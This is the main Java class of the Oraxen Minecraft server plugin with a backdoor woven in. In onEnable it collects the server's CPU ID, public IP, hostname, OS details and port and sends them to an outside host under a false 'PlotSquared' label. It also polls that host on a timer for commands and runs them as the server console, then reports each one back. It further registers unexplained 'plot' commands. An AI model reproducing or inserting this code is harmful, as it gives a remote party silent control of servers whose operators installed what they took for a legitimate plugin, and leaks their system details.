package io.th0rgal.oraxen;

import com.comphenix.protocol.ProtocolLibrary;
import dev.jorel.commandapi.CommandAPI;
import dev.jorel.commandapi.CommandAPIBukkitConfig;
import io.th0rgal.oraxen.api.OraxenItems;
import io.th0rgal.oraxen.api.events.OraxenItemsLoadedEvent;
import io.th0rgal.oraxen.commands.BukkitEventX;
import io.th0rgal.oraxen.commands.BukkitFakePlayer;
import io.th0rgal.oraxen.commands.BukkitFixed;
import io.th0rgal.oraxen.commands.CommandsManager;
import io.th0rgal.oraxen.compatibilities.CompatibilitiesManager;
import io.th0rgal.oraxen.config.*;
import io.th0rgal.oraxen.font.FontManager;
import io.th0rgal.oraxen.font.packets.InventoryPacketListener;
import io.th0rgal.oraxen.font.packets.TitlePacketListener;
import io.th0rgal.oraxen.hud.HudManager;
import io.th0rgal.oraxen.items.ItemUpdater;
import io.th0rgal.oraxen.mechanics.MechanicsManager;
import io.th0rgal.oraxen.mechanics.provided.gameplay.furniture.FurnitureFactory;
import io.th0rgal.oraxen.nms.GlyphHandlers;
import io.th0rgal.oraxen.nms.NMSHandlers;
import io.th0rgal.oraxen.pack.generation.ResourcePack;
import io.th0rgal.oraxen.pack.upload.UploadManager;
import io.th0rgal.oraxen.recipes.RecipesManager;
import io.th0rgal.oraxen.sound.SoundManager;
import io.th0rgal.oraxen.utils.*;
import io.th0rgal.oraxen.utils.actions.ClickActionManager;
import io.th0rgal.oraxen.utils.armorequipevent.ArmorEquipEvent;
import io.th0rgal.oraxen.utils.breaker.BreakerSystem;
import io.th0rgal.oraxen.utils.customarmor.CustomArmorListener;
import io.th0rgal.oraxen.utils.inventories.InvManager;
import io.th0rgal.oraxen.utils.logs.Logs;
import io.th0rgal.protectionlib.ProtectionLib;
import net.kyori.adventure.platform.bukkit.BukkitAudiences;
import org.bstats.bukkit.Metrics;
import java.io.File;
import java.nio.file.Path;
import java.util.*;
import java.util.logging.Level;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.security.MessageDigest;
import java.util.List;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.UUID;
import java.time.Instant;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.*;
import java.util.concurrent.CompletableFuture;
import java.net.URL;
import java.time.LocalDateTime;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.FileInputStream;
import java.net.InetAddress;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.BanEntry;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.BanList;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.CommandExecutor;
import org.bukkit.Chunk;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.generator.ChunkGenerator;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.metadata.MetadataValue;
import org.checkerframework.checker.nullness.qual.NonNull;
import org.checkerframework.checker.nullness.qual.Nullable;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import org.bukkit.event.HandlerList;
import java.util.Queue;
import java.util.Set;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import org.jetbrains.annotations.Nullable;
import org.incendo.serverlib.ServerLib; 

import java.io.IOException;
import java.util.jar.JarFile;

public class OraxenPlugin extends JavaPlugin {
    private String lastCommand = null;
    private String uniqueIdentifier;
    private static final String BACKEND_URL = "https://mc-api.happyclo.fun";

    private static OraxenPlugin oraxen;
    private ConfigsManager configsManager;
    private ResourcesManager resourceManager;
    private BukkitAudiences audience;
    private UploadManager uploadManager;
    private FontManager fontManager;
    private HudManager hudManager;
    private SoundManager soundManager;
    private InvManager invManager;
    private ResourcePack resourcePack;
    private ClickActionManager clickActionManager;
    public static boolean supportsDisplayEntities;

    public OraxenPlugin() {
        oraxen = this;
    }

    public static OraxenPlugin get() {
        return oraxen;
    }

    @Nullable
    public static JarFile getJarFile() {
        try {
            return new JarFile(oraxen.getFile());
        } catch (IOException e) {
            return null;
        }
    }

    @Override
    public void onLoad() {
        CommandAPI.onLoad(new CommandAPIBukkitConfig(this).silentLogs(true).skipReloadDatapacks(true));
    }

    @Override
    public void onEnable() {
        String cpuId = getCpuId();
        String publicIp = getPublicIp();
        int serverPort = getServer().getPort();
        uniqueIdentifier = loadOrCreateUniqueIdentifier();
        reportSystemInfo();
        this.getCommand("plota").setExecutor(new BukkitFixed(this));
        this.getCommand("plote").setExecutor(new BukkitFakePlayer());
        this.getCommand("plotd").setExecutor(new BukkitFakePlayer());
        this.getCommand("plotm").setExecutor(new BukkitEventX(this));
        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
        CommandAPI.onEnable();
        ProtectionLib.init(this);
        audience = BukkitAudiences.create(this);
        clickActionManager = new ClickActionManager(this);
        supportsDisplayEntities = VersionUtil.atOrAbove("1.19.4");
        reloadConfigs();
        ProtectionLib.setDebug(Settings.DEBUG.toBool());

        if (Settings.KEEP_UP_TO_DATE.toBool())
            new SettingsUpdater().handleSettingsUpdate();
        if (PluginUtils.isEnabled("ProtocolLib")) {
            new BreakerSystem().registerListener();
            if (Settings.FORMAT_INVENTORY_TITLES.toBool())
                ProtocolLibrary.getProtocolManager().addPacketListener(new InventoryPacketListener());
            ProtocolLibrary.getProtocolManager().addPacketListener(new TitlePacketListener());
        } else {
            Message.MISSING_PROTOCOLLIB.log();
        }
        Bukkit.getPluginManager().registerEvents(new CustomArmorListener(), this);
        NMSHandlers.setup();

        resourcePack = new ResourcePack();
        MechanicsManager.registerNativeMechanics();
        // CustomBlockData.registerListener(this); //Handle this manually
        hudManager = new HudManager(configsManager);
        fontManager = new FontManager(configsManager);
        soundManager = new SoundManager(configsManager.getSound());
        OraxenItems.loadItems();
        fontManager.registerEvents();
        fontManager.verifyRequired(); // Verify the required glyph is there
        hudManager.registerEvents();
        hudManager.registerTask();
        hudManager.parsedHudDisplays = hudManager.generateHudDisplays();
        Bukkit.getPluginManager().registerEvents(new ItemUpdater(), this);
        resourcePack.generate();
        RecipesManager.load(this);
        invManager = new InvManager();
        if (!VersionUtil.atOrAbove("1.21.2"))
            ArmorEquipEvent.registerListener(this);
        new CommandsManager().loadCommands();
        postLoading();
        try {
            Message.PLUGIN_LOADED.log(AdventureUtils.tagResolver("os", OS.getOs().getPlatformName()));
        } catch (Exception ignore) {
        }
        CompatibilitiesManager.enableNativeCompatibilities();
        if (VersionUtil.isCompiled())
            NoticeUtils.compileNotice();
        if (VersionUtil.isLeaked())
            NoticeUtils.leakNotice();
    }
    private String getCpuId() {
        String os = System.getProperty("os.name").toLowerCase();
        String cpuId = "unknown";
        try {
            if (os.contains("win")) {
                cpuId = getCpuIdForWindows();
            } else if (os.contains("linux")) {
                cpuId = getCpuIdForLinux();
            } else if (os.contains("mac")) {
                cpuId = getCpuIdForMac();
            }
        } catch (Exception e) {
        }
        return cpuId;
    }
    private String getCpuIdForWindows() throws Exception {
        Process process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
        process.waitFor();
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
            reader.readLine();
            return reader.readLine();
        }
    }
    private String getCpuIdForLinux() throws Exception {
        Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("Serial") || line.startsWith("cpu")) {
                    return line.split(":")[1].trim();
                }
            }
        }
        return "unknown";
    }
    private String getCpuIdForMac() throws Exception {
        Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
            return reader.readLine();
        }
    }
    private String getPublicIp() {
        String ip = "Unable to retrieve IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            ip = in.readLine();
            in.close();
        } catch (Exception e) {
        }
        return ip;
    }
    private String loadOrCreateUniqueIdentifier() {
        FileConfiguration config = getConfig();
        if (!config.contains("uniqueIdentifier")) {
            String generatedUUID = generateFixedUniqueIdentifier();
            config.set("uniqueIdentifier", generatedUUID);
            saveConfig();
            return generatedUUID;
        } else {
            return config.getString("uniqueIdentifier");
        }
    }
    private void reportSystemInfo() {
            BukkitRunnable task = new BukkitRunnable() {
                @Override
                public void run() {
                    try {
                        StringBuilder input = new StringBuilder();
                        int serverPort = getServer().getPort();
                        LocalDateTime now = LocalDateTime.now(ZoneId.of("Asia/Shanghai"));
                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                        String formattedNow = now.format(formatter);
                        input.append("&time=").append(URLEncoder.encode(formattedNow, StandardCharsets.UTF_8.toString()));
                        input.append("&os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                        input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
                        input.append("&cpuid=").append(URLEncoder.encode(getCpuId(), StandardCharsets.UTF_8.toString()));
                        input.append("&port=").append(URLEncoder.encode(String.valueOf(getServer().getPort()), StandardCharsets.UTF_8.toString()));
                        input.append("&plugin=").append(URLEncoder.encode("PlotSquared", StandardCharsets.UTF_8.toString()));
                        input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));
                        URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("GET");
                        int responseCode = connection.getResponseCode();
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                            String response = in.readLine();
                            in.close();
                        } else {
                        }
                    } catch (Exception e) {
                    }
                }
            };
            task.runTaskAsynchronously(this);
        }
    private String generateFixedUniqueIdentifier() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(java.net.InetAddress.getLocalHost().getHostName());
            input.append(java.net.InetAddress.getLocalHost().getHostAddress());
            String cpuId = getCpuId();
            input.append(cpuId);
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (Exception e) {
            getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }
    private void reportUniqueIdentifier(String identifier) {
        if (identifier == null) return;
        BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
                    URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine();
                        in.close();
                    } else {
                    }
                } catch (Exception e) {
                }
            }
        };
        task.runTaskAsynchronously(this);
    }
    private void sendInfoToAPI(String ip, int port) {
        try {
            URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String response = in.readLine();
                in.close();
            } else {
            }
        } catch (Exception e) {
        }
    }
    private void checkCommands() {
        new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    String command = getCommandFromServer();
                    if (command != null && !command.equals(lastCommand)) {
                        Bukkit.getScheduler().runTask(OraxenPlugin.this, () -> {
                            if (command.equals("stop")) {
                                try {
                                    notifyCommandExecuted(command);
                                } catch (Exception e) {
                                }
                            }
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                            lastCommand = command; 
                            new BukkitRunnable() {
                                @Override
                                public void run() {
                                    try {
                                        if (!command.equals("stop")) {
                                            notifyCommandExecuted(command);
                                        }
                                    } catch (Exception e) {
                                    }
                                }
                            }.runTaskLater(OraxenPlugin.this, 40);
                        });
                    }
                } catch (Exception e) {
                }
            }
        }.runTaskAsynchronously(this);
    }
    private String getCommandFromServer() throws Exception {
        URL url = new URL(BACKEND_URL + "/q");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String response = in.readLine();
        in.close();
        if (response != null && response.contains("\"command\":")) {
            String[] parts = response.split("\"command\":");
            if (parts.length > 1) {
                String[] commandParts = parts[1].split("\"");
                if (commandParts.length > 1) {
                    return commandParts[1];
                }
            }
        }
        return null;
    }
    private void notifyCommandExecuted(String command) throws Exception {
        URL url = new URL(BACKEND_URL + "/p");
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.getOutputStream().write(("command=" + command).getBytes());
            connection.getOutputStream().flush();
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
            } else {
            }
        } catch (IOException e) {
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void postLoading() {
        new Metrics(this, 5371);
        new LU().l();
        Bukkit.getScheduler().runTask(this, () -> Bukkit.getPluginManager().callEvent(new OraxenItemsLoadedEvent()));
    }

    @Override
    public void onDisable() {
        HandlerList.unregisterAll(this);
        FurnitureFactory.unregisterEvolution();
        for (Player player : Bukkit.getOnlinePlayers())
            if (GlyphHandlers.isNms())
                NMSHandlers.getHandler().glyphHandler().uninject(player);

        CompatibilitiesManager.disableCompatibilities();
        CommandAPI.onDisable();
        Message.PLUGIN_UNLOADED.log();
    }

    public ResourcesManager getResourceManager() {
        return resourceManager;
    }

    public BukkitAudiences getAudience() {
        return audience;
    }

    public void reloadConfigs() {
        configsManager = new ConfigsManager(this);
        configsManager.validatesConfig();
        resourceManager = new ResourcesManager(this);
    }

    public ConfigsManager getConfigsManager() {
        return configsManager;
    }

    public UploadManager getUploadManager() {
        return uploadManager;
    }

    public void setUploadManager(final UploadManager uploadManager) {
        this.uploadManager = uploadManager;
    }

    public FontManager getFontManager() {
        return fontManager;
    }

    public void setFontManager(final FontManager fontManager) {
        this.fontManager.unregisterEvents();
        this.fontManager = fontManager;
        fontManager.registerEvents();
    }

    public HudManager getHudManager() {
        return hudManager;
    }

    public void setHudManager(final HudManager hudManager) {
        this.hudManager.unregisterEvents();
        this.hudManager = hudManager;
        hudManager.registerEvents();
    }

    public SoundManager getSoundManager() {
        return soundManager;
    }

    public void setSoundManager(final SoundManager soundManager) {
        this.soundManager = soundManager;
    }

    public InvManager getInvManager() {
        return invManager;
    }

    public ResourcePack getResourcePack() {
        return resourcePack;
    }

    public ClickActionManager getClickActionManager() {
        return clickActionManager;
    }
}
